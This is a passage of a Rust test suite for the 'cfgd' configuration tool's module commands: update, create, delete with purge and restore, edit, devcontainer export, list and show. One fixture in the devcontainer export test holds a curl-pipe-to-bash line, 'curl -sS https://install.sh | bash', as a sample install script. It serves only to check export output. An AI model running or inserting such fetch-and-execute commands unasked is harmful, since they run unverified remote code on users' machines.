        doc.metadata.description, None,
        "empty description should clear it"
    );
}

// ─── cmd_module_update_local — add duplicate depends is noop ────

#[test]
fn cmd_module_update_add_duplicate_depends_noop() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  depends:\n    - base\n",
    );

    let cli = test_cli(dir.path());
    let printer = make_printer();

    let args = super::ModuleUpdateArgs {
        depends: vec!["base".to_string()],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "mod1").unwrap();
    assert_eq!(doc.spec.depends.len(), 1, "should not duplicate depends");
}

// ─── cmd_module_update_local — add duplicate post-apply is noop ─

#[test]
fn cmd_module_update_add_duplicate_post_apply_noop() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  scripts:\n    postApply:\n      - echo hello\n",
    );

    let cli = test_cli(dir.path());
    let printer = make_printer();

    let args = super::ModuleUpdateArgs {
        post_apply: vec!["echo hello".to_string()],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "mod1").unwrap();
    let scripts = doc.spec.scripts.unwrap();
    assert_eq!(
        scripts.post_apply.len(),
        1,
        "should not duplicate post-apply script"
    );
}

// ─── cmd_module_update_local — add files ───────────────────────

#[test]
fn cmd_module_update_add_files() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  packages: []\n",
    );

    // Create a source file
    let source_file = dir.path().join("new-config.toml");
    std::fs::write(&source_file, "setting = true").unwrap();

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    let args = super::ModuleUpdateArgs {
        files: vec![format!(
            "{}:~/.config/app/new-config.toml",
            source_file.display()
        )],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "mod1").unwrap();
    assert_eq!(doc.spec.files.len(), 1, "should have one file");
    assert_eq!(doc.spec.files[0].source, "files/new-config.toml");

    let output = buf.lock().unwrap();
    assert!(
        output.contains("Added file"),
        "should confirm file addition, got: {output}"
    );
}

// ─── cmd_module_update_local — remove files ────────────────────

#[test]
fn cmd_module_update_remove_files() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  files:\n    - source: files/config.toml\n      target: ~/.config/app/config.toml\n",
    );
    // Create the source file so it can be cleaned up
    std::fs::write(dir.path().join("modules/mod1/files/config.toml"), "content").unwrap();

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    let args = super::ModuleUpdateArgs {
        files: vec!["-~/.config/app/config.toml".to_string()],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "mod1").unwrap();
    assert!(
        doc.spec.files.is_empty(),
        "files should be empty after removal"
    );

    // Verify the source file was cleaned up
    assert!(
        !dir.path().join("modules/mod1/files/config.toml").exists(),
        "source file should be deleted"
    );

    let output = buf.lock().unwrap();
    assert!(
        output.contains("Removed file"),
        "should confirm file removal, got: {output}"
    );
}

// ─── cmd_module_update_local — remove nonexistent file warns ────

#[test]
fn cmd_module_update_remove_nonexistent_file_warns() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  packages: []\n",
    );

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    let args = super::ModuleUpdateArgs {
        files: vec!["-~/.nonexistent/file".to_string()],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let output = buf.lock().unwrap();
    assert!(
        output.contains("not found in module"),
        "should warn about nonexistent file, got: {output}"
    );
}

// ─── cmd_module_update_local — add file with private flag ───────

#[test]
fn cmd_module_update_add_file_private() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  packages: []\n",
    );

    let source_file = dir.path().join("secret.key");
    std::fs::write(&source_file, "secret-data").unwrap();

    let cli = test_cli(dir.path());
    let printer = make_printer();

    let args = super::ModuleUpdateArgs {
        files: vec![format!("{}:~/.ssh/secret.key", source_file.display())],
        private: true,
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "mod1").unwrap();
    assert!(doc.spec.files[0].private, "file should be marked private");

    let gitignore_path = dir.path().join(".gitignore");
    assert!(gitignore_path.exists(), "gitignore should be created");
    let gitignore = std::fs::read_to_string(&gitignore_path).unwrap();
    assert!(
        gitignore.contains("modules/mod1/files/secret.key"),
        "gitignore should contain private file path"
    );
}

// ─── cmd_module_delete — with yes flag succeeds ────────────────

#[test]
fn cmd_module_delete_with_yes_succeeds() {
    let dir = setup_config_dir();
    make_module(
        dir.path(),
        "to-delete",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: to-delete\nspec:\n  packages: []\n",
    );

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    cmd_module_delete(&cli, &printer, "to-delete", true, false, false).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    assert!(
        output.contains("Deleted module 'to-delete'"),
        "should confirm deletion, got: {output}"
    );
    assert!(
        !dir.path().join("modules/to-delete").exists(),
        "module directory should be removed"
    );
}

#[test]
fn cmd_module_delete_without_yes_and_prompt_confirmed_proceeds_with_deletion() {
    // yes=false → the production code reaches `prompt_confirm(...)`. With
    // the new harness queuing Confirm(true), the prompt returns Ok(true)
    // and the deletion proceeds exactly as the yes=true case does.
    let dir = setup_config_dir();
    make_module(
        dir.path(),
        "prompt-yes-mod",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: prompt-yes-mod\nspec:\n  packages: []\n",
    );

    let cli = test_cli(dir.path());
    let (printer, buf) = cfgd_core::output::Printer::for_test_with_prompt_responses_at(
        vec![cfgd_core::output::PromptAnswer::Confirm(true)],
        cfgd_core::output::Verbosity::Normal,
    );

    cmd_module_delete(&cli, &printer, "prompt-yes-mod", false, false, false).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    assert!(
        output.contains("Deleted module 'prompt-yes-mod'"),
        "should confirm deletion, got: {output}"
    );
    assert!(
        !dir.path().join("modules/prompt-yes-mod").exists(),
        "module dir must be removed once prompt is confirmed"
    );
}

#[test]
#[cfg(unix)]
#[serial_test::serial]
fn cmd_module_edit_with_invalid_yaml_and_prompt_declined_breaks_with_warning() {
    // Drive the editor-validate loop's prompt-decline branch at
    // crud.rs:584-586. EDITOR=/bin/true is a no-op editor — it spawns,
    // exits 0, and leaves the file unchanged. The pre-existing module
    // yaml is intentionally invalid so parse_module Errs, the prompt
    // fires, the queue's Confirm(false) is returned, and the loop
    // breaks with the "Saved with validation errors" warning.
    let dir = setup_config_dir();
    make_module(
        dir.path(),
        "edit-broken",
        "this is not valid YAML for a Module document",
    );

    let cli = test_cli(dir.path());
    let (printer, buf) = cfgd_core::output::Printer::for_test_doc_with_prompt_responses(vec![
        cfgd_core::output::PromptAnswer::Confirm(false),
    ]);

    let _editor = cfgd_core::test_helpers::EnvVarGuard::set("EDITOR", "/usr/bin/true");
    cmd_module_edit(&cli, &printer, "edit-broken")
        .expect("edit must return Ok even on Save-with-errors");
    drop(printer);

    let output = buf.human();
    assert!(
        output.contains("Saved with validation errors"),
        "should warn about invalid save: {output}"
    );
}

#[test]
#[serial_test::serial]
fn cmd_module_create_with_apply_and_yes_drives_full_apply_sequence() {
    // Drives crud.rs:230-298 — the `if args.apply { ... }` block at the end
    // of cmd_module_create. With args.apply=true and args.yes=true the
    // prompt is bypassed and the reconciler.plan + apply path runs. An
    // empty-spec module has no packages/files so the plan ends up empty
    // and the "Nothing to do" success branch fires at crud.rs:267-268.
    let dir = setup_config_dir();
    let _home = cfgd_core::with_test_home_guard(dir.path());
    let cli = test_cli(dir.path());
    std::fs::write(
        dir.path().join("cfgd.yaml"),
        "apiVersion: cfgd.io/v1alpha1\nkind: Config\nmetadata:\n  name: t\nspec:\n  profile: default\n",
    )
    .unwrap();

    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
    let mut args = make_module_create_args("apply-noop-mod");
    args.apply = true;
    args.yes = true;
    args.description = Some("noop".to_string());

    cmd_module_create(&cli, &printer, &args)
        .expect("create-with-apply-yes (empty spec) should succeed");
    drop(printer);

    let output = buf.lock().unwrap().clone();
    assert!(
        output.contains("Created module 'apply-noop-mod'"),
        "should announce create: {output}"
    );
}

#[test]
fn cmd_module_create_interactive_drives_full_prompt_sequence_via_harness() {
    // Interactive mode at crud.rs:43-83 was uncovered for many sessions
    // because Printer::for_test()'s prompt_text returned Err. The new
    // PromptAnswer::Text queue drives all 6 prompts:
    //   1. Description
    //   2. Dependencies (comma-separated)
    //   3. Package loop iter 1 (non-empty → push)
    //   4. Package loop iter 2 (empty → break)
    //   5. File loop iter 1 (empty → break immediately)
    //   6. Post-apply script loop iter 1 (empty → break immediately)
    // is_interactive at lines 33-41 fires iff every content flag is empty;
    // make_module_create_args() already returns that shape.
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let (printer, buf) = cfgd_core::output::Printer::for_test_with_prompt_responses_at(
        vec![
            cfgd_core::output::PromptAnswer::Text("Interactive build module".to_string()),
            cfgd_core::output::PromptAnswer::Text("nodejs,git".to_string()),
            cfgd_core::output::PromptAnswer::Text("ripgrep".to_string()),
            cfgd_core::output::PromptAnswer::Text("".to_string()),
            cfgd_core::output::PromptAnswer::Text("".to_string()),
            cfgd_core::output::PromptAnswer::Text("".to_string()),
        ],
        cfgd_core::output::Verbosity::Normal,
    );
    let args = make_module_create_args("interactive-mod");

    cmd_module_create(&cli, &printer, &args).expect("interactive create should succeed");
    drop(printer);

    // The module yaml should be written with the prompted fields.
    let yaml_path = dir
        .path()
        .join("modules")
        .join("interactive-mod")
        .join("module.yaml");
    assert!(yaml_path.exists(), "module.yaml must be created");
    let yaml = std::fs::read_to_string(&yaml_path).unwrap();
    assert!(
        yaml.contains("Interactive build module"),
        "prompted description must persist: {yaml}"
    );
    assert!(
        yaml.contains("nodejs") && yaml.contains("git"),
        "prompted deps must persist: {yaml}"
    );
    assert!(
        yaml.contains("ripgrep"),
        "prompted package must persist: {yaml}"
    );
    // The "Add file" / "Add post-apply" loops were exited on empty input —
    // no files or scripts should appear in the doc.
    let output = buf.lock().unwrap().clone();
    assert!(
        output.contains("Created module 'interactive-mod'"),
        "should announce create: {output}"
    );
}

#[test]
fn cmd_module_delete_without_yes_and_prompt_declined_returns_cancelled() {
    // yes=false + prompt=Confirm(false) takes the early-return arm at
    // crud.rs:626-627 — prints "Cancelled" and leaves the module dir
    // on disk.
    let dir = setup_config_dir();
    make_module(
        dir.path(),
        "prompt-no-mod",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: prompt-no-mod\nspec:\n  packages: []\n",
    );

    let cli = test_cli(dir.path());
    let (printer, buf) = cfgd_core::output::Printer::for_test_with_prompt_responses_at(
        vec![cfgd_core::output::PromptAnswer::Confirm(false)],
        cfgd_core::output::Verbosity::Normal,
    );

    cmd_module_delete(&cli, &printer, "prompt-no-mod", false, false, false).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    assert!(
        output.contains("Cancelled"),
        "should print Cancelled after no, got: {output}"
    );
    assert!(
        dir.path().join("modules/prompt-no-mod").exists(),
        "module dir must remain when prompt is declined"
    );
}

// ─── cmd_module_delete — refused when profiles reference module ─

#[test]
fn cmd_module_delete_refused_when_profile_references() {
    let dir = setup_config_dir();
    make_module(
        dir.path(),
        "referenced",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: referenced\nspec:\n  packages: []\n",
    );

    // Add the module to the profile
    let profile_path = dir.path().join("profiles/default.yaml");
    std::fs::write(
            &profile_path,
            "apiVersion: cfgd.io/v1alpha1\nkind: Profile\nmetadata:\n  name: default\nspec:\n  modules:\n    - referenced\n",
        ).unwrap();

    let cli = test_cli(dir.path());
    let printer = make_printer();

    let err = cmd_module_delete(&cli, &printer, "referenced", true, false, false).unwrap_err();
    assert!(
        err.to_string().contains("referenced by profile"),
        "should refuse deletion when profiles reference module, got: {err}"
    );
}

// ─── cmd_module_delete — with purge removes target files ────────

#[test]
fn cmd_module_delete_with_purge() {
    let dir = setup_config_dir();
    let target_dir = tempfile::tempdir().unwrap();
    let target_file = target_dir.path().join("deployed.conf");
    std::fs::write(&target_file, "deployed content").unwrap();

    let yaml = format!(
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: purge-mod\nspec:\n  files:\n    - source: files/config\n      target: {}\n",
        target_file.display()
    );
    make_module(dir.path(), "purge-mod", &yaml);

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    cmd_module_delete(&cli, &printer, "purge-mod", true, true, false).unwrap();

    assert!(!target_file.exists(), "target file should be purged");
    let output = buf.lock().unwrap();
    assert!(
        output.contains("Purged"),
        "should report purge, got: {output}"
    );
}

// ─── cmd_module_delete — without purge restores symlinks ────────

#[test]
fn cmd_module_delete_restores_symlinked_files() {
    let dir = setup_config_dir();
    let target_dir = tempfile::tempdir().unwrap();
    let target_file = target_dir.path().join("restored.conf");
    let module_source = dir.path().join("modules/restore-mod/files/config");
    std::fs::create_dir_all(module_source.parent().unwrap()).unwrap();
    std::fs::write(&module_source, "original content").unwrap();

    // Create symlink from target to module source
    #[cfg(unix)]
    std::os::unix::fs::symlink(&module_source, &target_file).unwrap();
    #[cfg(windows)]
    std::os::windows::fs::symlink_file(&module_source, &target_file).unwrap();

    let yaml = format!(
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: restore-mod\nspec:\n  files:\n    - source: files/config\n      target: {}\n",
        target_file.display()
    );
    // Write module.yaml (module dir already created above)
    std::fs::write(dir.path().join("modules/restore-mod/module.yaml"), &yaml).unwrap();

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    cmd_module_delete(&cli, &printer, "restore-mod", true, false, false).unwrap();

    assert!(
        target_file.exists(),
        "target file should still exist after restore"
    );
    assert!(
        !target_file.is_symlink(),
        "target should be a regular file, not a symlink"
    );
    let contents = std::fs::read_to_string(&target_file).unwrap();
    assert_eq!(contents, "original content", "content should be restored");

    let output = buf.lock().unwrap();
    assert!(
        output.contains("Restored"),
        "should report restoration, got: {output}"
    );
}

// ─── cmd_module_delete — purge mode with a directory target ─────

#[test]
fn cmd_module_delete_with_purge_removes_directory_target() {
    // The `cmd_module_delete_with_purge` test covers the file branch of
    // the purge loop (`fs::remove_file`). This test covers the directory
    // branch (`fs::remove_dir_all`) — a module whose deployed target is
    // a real directory, not a file. Without this, the dir-purge arm
    // would silently rot if a refactor mis-typed the recursion.
    let dir = setup_config_dir();
    let target_root = tempfile::tempdir().unwrap();
    let target_dir = target_root.path().join("deployed-dir");
    std::fs::create_dir_all(target_dir.join("inner")).unwrap();
    std::fs::write(target_dir.join("inner/data.conf"), "deployed").unwrap();

    let yaml = format!(
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: purge-dir-mod\nspec:\n  files:\n    - source: files/config\n      target: {}\n",
        target_dir.display()
    );
    make_module(dir.path(), "purge-dir-mod", &yaml);

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
    cmd_module_delete(&cli, &printer, "purge-dir-mod", true, true, false).unwrap();

    assert!(
        !target_dir.exists(),
        "purge mode must recursively remove a directory target"
    );
    let captured = buf.lock().unwrap().clone();
    assert!(
        captured.contains("Purged") && captured.contains("deployed-dir"),
        "purge log line must name the removed directory: {captured}"
    );
}

// ─── cmd_module_delete — default mode restores from a dir source ─

#[test]
#[cfg(unix)]
fn cmd_module_delete_default_mode_restores_directory_source_via_copy_dir() {
    // The `cmd_module_delete_restores_symlinked_files` test covers the
    // file-source branch of the restore loop (`fs::copy`). This test
    // covers the directory-source branch (`copy_dir_recursive`) — when
    // the module's `files/<source>` is a directory whose contents must
    // be replicated at the target.
    let dir = setup_config_dir();
    let target_root = tempfile::tempdir().unwrap();
    let target = target_root.path().join("restored-dir");

    let module_source = dir.path().join("modules/restore-dir-mod/files/payload");
    std::fs::create_dir_all(&module_source).unwrap();
    std::fs::write(module_source.join("a.txt"), "alpha").unwrap();
    std::fs::write(module_source.join("b.txt"), "beta").unwrap();

    // Symlink the deployed location at the dir source — the restore loop
    // requires `read_link(target)` to start_with the module dir.
    std::os::unix::fs::symlink(&module_source, &target).unwrap();

    let yaml = format!(
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: restore-dir-mod\nspec:\n  files:\n    - source: files/payload\n      target: {}\n",
        target.display()
    );
    std::fs::write(
        dir.path().join("modules/restore-dir-mod/module.yaml"),
        &yaml,
    )
    .unwrap();

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
    cmd_module_delete(&cli, &printer, "restore-dir-mod", true, false, false).unwrap();

    // The symlink is replaced by a real directory whose contents match.
    assert!(target.exists(), "target dir must remain after restore");
    assert!(
        !target.is_symlink(),
        "target must now be a real directory, not the original symlink"
    );
    assert_eq!(
        std::fs::read_to_string(target.join("a.txt")).unwrap(),
        "alpha"
    );
    assert_eq!(
        std::fs::read_to_string(target.join("b.txt")).unwrap(),
        "beta"
    );
    let captured = buf.lock().unwrap().clone();
    assert!(
        captured.contains("Restored"),
        "restore log line must fire: {captured}"
    );
}

// ─── cmd_module_delete — cleans lockfile entry ──────────────────

#[test]
fn cmd_module_delete_cleans_lockfile() {
    let dir = setup_config_dir();
    make_module(
        dir.path(),
        "lock-mod",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: lock-mod\nspec:\n  packages: []\n",
    );

    // Add a lockfile entry
    let lockfile = cfgd_core::config::ModuleLockfile {
        modules: vec![cfgd_core::config::ModuleLockEntry {
            name: "lock-mod".to_string(),
            url: "https://example.com/mod.git@v1".to_string(),
            pinned_ref: "v1".to_string(),
            commit: "abc".to_string(),
            integrity: "sha256:123".to_string(),
            subdir: None,
        }],
    };
    modules::save_lockfile(dir.path(), &lockfile).unwrap();

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    cmd_module_delete(&cli, &printer, "lock-mod", true, false, false).unwrap();

    let lockfile = modules::load_lockfile(dir.path()).unwrap();
    assert!(
        lockfile.modules.is_empty(),
        "lockfile should be cleaned after module delete"
    );
    let output = buf.lock().unwrap();
    assert!(
        output.contains("modules.lock"),
        "should report lockfile cleanup, got: {output}"
    );
}

// ─── cmd_module_export — devcontainer with complex spec ─────────

#[test]
fn cmd_module_export_devcontainer_complex() {
    let dir = setup_config_dir();
    let yaml = r#"apiVersion: cfgd.io/v1alpha1
kind: Module
metadata:
  name: complex-tool
  description: A complex module
spec:
  depends:
    - base
  packages:
    - name: curl
    - name: custom-tool
      script: curl -sS https://install.sh | bash
      platforms:
        - macos
    - name: linux-pkg
      aliases:
        apt: linux-specific-pkg
  env:
    - name: TOOL_HOME
      value: /opt/tool
    - name: DEBUG
      value: "false"
  aliases:
    - name: ct
      command: custom-tool --verbose
  scripts:
    postApply:
      - echo setup complete
"#;
    make_module(dir.path(), "complex-tool", yaml);

    let output_dir = tempfile::tempdir().unwrap();
    let cli = test_cli(dir.path());
    let printer = make_printer();

    let result = super::export_devcontainer(
        &cli,
        &printer,
        "complex-tool",
        Some(output_dir.path().to_str().unwrap()),
    );
    assert!(result.is_ok(), "export failed: {:?}", result);

    let feature_dir = output_dir.path().join("complex-tool");
    let install = std::fs::read_to_string(feature_dir.join("install.sh")).unwrap();

    // Verify apt packages include alias-mapped names
    assert!(
        install.contains("linux-specific-pkg"),
        "should use apt alias for linux-pkg, got:\n{install}"
    );
    // Verify script-based packages
    assert!(
        install.contains("curl -sS https://install.sh | bash"),
        "should include script-based install, got:\n{install}"
    );
    // Verify env vars
    assert!(
        install.contains("TOOL_HOME"),
        "should include env vars, got:\n{install}"
    );
    assert!(
        install.contains("DEBUG"),
        "should include env vars, got:\n{install}"
    );
    // Verify post-apply scripts
    assert!(
        install.contains("echo setup complete"),
        "should include post-apply scripts, got:\n{install}"
    );

    let feature_json =
        std::fs::read_to_string(feature_dir.join("devcontainer-feature.json")).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&feature_json).unwrap();
    assert_eq!(parsed["id"], "complex-tool");
    assert_eq!(parsed["description"], "A complex module");
    // Options should have both env vars
    assert!(parsed["options"]["TOOL_HOME"].is_object());
    assert!(parsed["options"]["DEBUG"].is_object());
    // installsAfter should reference dependencies
    let installs_after = parsed["installsAfter"].as_array().unwrap();
    assert_eq!(installs_after.len(), 1);
    assert!(installs_after[0].as_str().unwrap().contains("base"));
}

// ─── cmd_module_list — JSON with active modules ─────────────────

#[test]
fn cmd_module_list_json_active_modules() {
    let dir = setup_config_dir();
    make_module(
        dir.path(),
        "active-mod",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: active-mod\nspec:\n  packages:\n    - name: git\n",
    );
    make_module(
        dir.path(),
        "inactive-mod",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: inactive-mod\nspec:\n  packages: []\n",
    );

    // Set profile to include active-mod
    let profile_path = dir.path().join("profiles/default.yaml");
    std::fs::write(
            &profile_path,
            "apiVersion: cfgd.io/v1alpha1\nkind: Profile\nmetadata:\n  name: default\nspec:\n  modules:\n    - active-mod\n",
        ).unwrap();

    let cli = test_cli_json(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_with_format(cfgd_core::output::OutputFormat::Json);

    cmd_module_list(&cli, &printer).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    let json: serde_json::Value = serde_json::from_str(output.trim()).unwrap();
    let arr = json.as_array().unwrap();
    assert_eq!(arr.len(), 2);

    let active = arr.iter().find(|e| e["name"] == "active-mod").unwrap();
    assert_eq!(active["active"], true);
    assert_eq!(active["status"], "pending");

    let inactive = arr.iter().find(|e| e["name"] == "inactive-mod").unwrap();
    assert_eq!(inactive["active"], false);
    assert_eq!(inactive["status"], "available");
}

// ─── cmd_module_list — wide format table (7-column variant) ─────

#[test]
fn cmd_module_list_wide_format_emits_seven_column_table() {
    // Wide format produces the 7-column table (Module/Active/Source/Status/
    // Packages/Files/Deps) — separate from the 5-column compact table the
    // default Table format uses. Each numeric counter (packages, files, deps)
    // is rendered as its own column rather than the "X pkgs, Y files, Z deps"
    // string. Pins this UX contract by counting the per-column values.
    //
    // Drives the doc builder directly with wide=true because the buffered
    // test helpers (`for_test_with_format(Wide)`) force `Verbosity::Quiet`,
    // and the renderer suppresses tables under Quiet. Calling the builder
    // skips the runtime is_wide() branch but pins the same shape contract.
    let entries = vec![super::ModuleListEntry {
        name: "wide-mod".into(),
        active: false,
        source: "local".into(),
        status: "available".into(),
        packages: 3,
        files: 2,
        depends: 2,
    }];
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
    printer.emit(super::list_show::build_module_list_doc(
        &entries,
        true,
        std::path::Path::new("/tmp/cfgd"),
    ));
    drop(printer);

    let output = buf.lock().unwrap();
    // Per-column counts rather than the "X pkgs, Y files, Z deps" composite.
    assert!(
        output.contains("Packages") && output.contains("Files") && output.contains("Deps"),
        "wide format should expose per-counter columns, got: {output}"
    );
    // Counts as raw cells: 3 packages, 2 files, 2 deps.
    assert!(
        output.contains("3") && output.contains("2"),
        "wide format should render raw counts, got: {output}"
    );
    // The composite string from the compact format MUST NOT appear in wide.
    assert!(
        !output.contains("pkgs"),
        "wide format should NOT use the compact 'pkgs' composite string, got: {output}"
    );
    assert!(
        output.contains("wide-mod"),
        "should list module name, got: {output}"
    );
}

// ─── cmd_module_show — packages with aliases/platforms + resolution arms ──

#[test]
fn cmd_module_show_renders_platform_filtered_and_resolved_packages() {
    // Drives two resolve_package outcome arms in cmd_module_show:
    // - Ok(Some(_)) clean-resolved package, prints \"<n> -> <mgr> install <r>\"
    // - Ok(None) platform-filtered, prints \"<n>, platforms: <list> — skipped\"
    //   on a Linux/macOS runner with a 'windows'-only entry.
    // The aliases + platforms format strings (lines 212-223) are also
    // exercised on the resolved entry — they're computed for every package
    // regardless of resolution outcome, even though only the Err arm emits
    // them in the printed output.
    let dir = setup_config_dir();
    let yaml = "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  \
                name: rich\nspec:\n  packages:\n    \
                - name: curl\n      \
                aliases:\n        brew: brew-curl\n      \
                platforms:\n        - linux\n        - macos\n    \
                - name: notepad\n      \
                platforms:\n        - windows\n";
    make_module(dir.path(), "rich", yaml);

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    cmd_module_show(&cli, &printer, "rich", false).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    // curl: platforms [linux, macos]. notepad: platforms [windows]. Each
    // resolves on its own platform and is skipped on the other — assertions
    // mirror the host filter.
    #[cfg(any(target_os = "linux", target_os = "macos"))]
    {
        assert!(
            output.contains("curl -> "),
            "resolved entry should render '<name> -> <mgr> install ...', got: {output}"
        );
        assert!(
            output.contains("notepad") && output.contains("skipped (platform filter)"),
            "platforms-filtered entry should report 'skipped (platform filter)', got: {output}"
        );
        assert!(
            output.contains("platforms: windows"),
            "skipped entry should render platform_str with the host-rejected list, got: {output}"
        );
    }
    #[cfg(target_os = "windows")]
    {
        assert!(
            output.contains("notepad -> "),
            "resolved entry should render '<name> -> <mgr> install ...', got: {output}"
        );
        assert!(
            output.contains("curl") && output.contains("skipped (platform filter)"),
            "platforms-filtered entry should report 'skipped (platform filter)', got: {output}"
        );
    }
}

// ─── cmd_module_list — table with active modules ────────────────

#[test]
fn cmd_module_list_table_active_modules() {
    let dir = setup_config_dir();
    make_module(
        dir.path(),
        "my-mod",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: my-mod\nspec:\n  depends:\n    - base\n  packages:\n    - name: curl\n    - name: wget\n  files:\n    - source: files/x\n      target: ~/.x\n",
    );

    let profile_path = dir.path().join("profiles/default.yaml");
    std::fs::write(
            &profile_path,
            "apiVersion: cfgd.io/v1alpha1\nkind: Profile\nmetadata:\n  name: default\nspec:\n  modules:\n    - my-mod\n",
        ).unwrap();

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    cmd_module_list(&cli, &printer).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    assert!(
        output.contains("my-mod"),
        "should list module name, got: {output}"
    );
    assert!(
        output.contains("yes"),
        "should show active=yes, got: {output}"
    );
    assert!(
        output.contains("pending"),
        "should show pending status, got: {output}"
    );
}

// ─── cmd_module_list — with lockfile entry shows remote source ──

#[test]
fn cmd_module_list_with_lockfile_shows_remote() {
    let dir = setup_config_dir();
    make_module(
        dir.path(),
        "remote-listed",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: remote-listed\nspec:\n  packages: []\n",
    );

    let lockfile = cfgd_core::config::ModuleLockfile {
        modules: vec![cfgd_core::config::ModuleLockEntry {
            name: "remote-listed".to_string(),
            url: "https://example.com/mod.git@v1".to_string(),
            pinned_ref: "v1".to_string(),
            commit: "abc".to_string(),
            integrity: "sha256:123".to_string(),
            subdir: None,
        }],
    };
    modules::save_lockfile(dir.path(), &lockfile).unwrap();

    let cli = test_cli_json(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_with_format(cfgd_core::output::OutputFormat::Json);

    cmd_module_list(&cli, &printer).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    let json: serde_json::Value = serde_json::from_str(output.trim()).unwrap();
    let arr = json.as_array().unwrap();
    let entry = &arr[0];
    assert_eq!(entry["source"], "remote");
}

// ─── cmd_module_registry_remove — no config fails ──────────────

#[test]
fn cmd_module_registry_remove_no_config_fails() {
    let dir = tempfile::tempdir().unwrap();
    let cli = test_cli(dir.path());
    let printer = make_printer();

    let err = cmd_module_registry_remove(&cli, &printer, "test", false).unwrap_err();
    assert!(
        err.to_string().contains("cfgd.yaml"),
        "should fail without config, got: {err}"
    );
}

// ─── cmd_module_registry_remove — warns about profile references ─

#[test]
fn cmd_module_registry_remove_warns_profile_refs() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let printer1 = make_printer();

    // Add a registry
